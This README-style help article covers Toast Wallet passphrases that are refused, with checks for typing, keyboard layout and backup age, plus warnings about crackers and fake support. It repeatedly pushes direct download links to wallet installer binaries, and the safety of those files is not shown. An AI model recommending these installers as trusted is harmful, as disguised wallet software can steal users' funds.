<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet passphrase not working</h1>

<p align="center">Common typing and backup-age reasons a passphrase is refused.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

A Toast Wallet passphrase is usually refused because of a typing detail, a different keyboard layout, or because the backup you are restoring was made with an older passphrase. Work through the checks below in the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0); if none succeed, unlock the backup with the six recovery words instead.

## 👀 You'll see this if

- You are sure the passphrase is right, but Toast Wallet says it is wrong.
- Sending XRP fails at the passphrase step.
- A restore stops at the passphrase screen.
- The passphrase worked on your old computer but not on the new one.

## 🤔 Why it happens

Passphrases are exact. A capital letter, an extra space at the end or a different accent turns a correct phrase into a wrong one. Moving between computers adds more chances for mismatch: a laptop with a different keyboard layout can type a different symbol for the same key, and some systems replace straight quotes with curly ones.

The second big cause is timing. A backup code is a snapshot. It opens only with the passphrase that was active when that backup was made. If you changed your passphrase later, the old backup still expects the old passphrase. People often try their newest passphrase on an old backup and conclude the backup is broken, when it is simply asking for the passphrase from its own time.

## 🧭 Before you start

Write a private list of every passphrase you might have used and the approximate dates. Put your backup codes in date order next to it. Having this in front of you turns a frustrating guessing game into a calm, methodical check.

## 🛠️ Fix: work through the checks

1. **Type slowly in a visible place.** Type the passphrase into a plain text editor on your own computer to see exactly what the keyboard produces, then delete it afterwards. Watch for Caps Lock and Num Lock.
2. **Check the keyboard layout.** On Windows, look at the language indicator next to the clock. On macOS, check the input menu. Switch to the layout you used when the passphrase was created.
3. **Remove extra spaces.** Make sure there is no space before or after the phrase, and only single spaces between words if your phrase has them.
4. **Avoid copy and paste from notes apps.** Some apps add invisible characters or change quotes. Type it by hand.
5. **Match the backup's age.** If restoring, try the passphrase that was in use when that specific backup was made. Older backups need older passphrases. The idea is explained in [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md).
6. **Use the six words instead.** If you kept the six recovery words from the same period, use them in place of the passphrase when restoring. Steps are in [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
7. **Make a fresh backup.** Once you are in, set a new passphrase you can type reliably and create a new backup code.

## ⚠️ Common mistakes

- Using the PIN where the passphrase is asked for. They are different secrets with different jobs.
- Testing a new passphrase on a backup made years ago, before that passphrase existed.
- Copying the passphrase from a phone note that silently added a trailing space or changed an apostrophe.
- Repeating the same wrong attempt many times instead of writing down which variations have already been tried.
- Searching online for a "passphrase cracker", which only leads to scam pages that steal backup codes.

## 🔁 If that did not work

- **You forgot the passphrase completely.** Follow [Toast Wallet forgot passphrase](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-forgot-passphrase.md).
- **The PIN is the problem, not the passphrase.** See [reset your Toast Wallet PIN](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-reset-pin.md).
- **You are on an old version.** Remove it and install the current release. Some older builds behave differently on new systems.
- **A stranger offers to unlock it for you.** Stop and read [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md).

## 🛡️ Prevention

Choose a passphrase made of ordinary words separated by single spaces, without characters that move around between keyboard layouts. Write it on paper exactly as typed. Each time you change it, make a new backup code and write the date on both.

## 📝 Good to know

It can help to remember that Toast Wallet does not limit you to a single guess in the restore screen. Take your time, try each candidate passphrase carefully and keep notes. The encryption does not get "angry" with repeated attempts; it simply opens only for the exact right phrase. Patience and a written list of candidates solve more passphrase problems than anything else.

## 🔍 A closer look at keyboard layouts

Keyboard layouts are a surprisingly common cause. On a UK keyboard, the `@` and `"` keys are swapped compared with a US keyboard. On many European layouts, `Y` and `Z` trade places, and symbols move around entirely. If you created your passphrase on one layout and now type it on another, the screen may look right while the characters are different. Switching the layout temporarily to the original one, or typing the phrase into a local text editor to see the result, quickly reveals this.

## ❓ FAQ

<details>
<summary>Is there a limit on attempts?</summary>

Try carefully and methodically rather than quickly. Keep notes of which variations you tried.

</details>

<details>
<summary>Can the passphrase be different on two computers?</summary>

Yes, if you changed it on one and restored an older backup on the other. Each backup keeps its own passphrase.

</details>

<details>
<summary>Should I try passphrase-cracking software?</summary>

No. Downloadable "crackers" are a common way to spread malware that targets wallets.

</details>

> [!WARNING]
> Never paste your passphrase, words or backup code into a website or share them in a chat, even with someone who seems helpful.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet forgot passphrase](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-forgot-passphrase.md) | Options when you no longer remember the passphrase. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) | Why the encrypted backup code is the real key to restoring. |
| [Reset your Toast Wallet PIN](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-reset-pin.md) | Use Reset PIN with your passphrase, then choose a new PIN. |
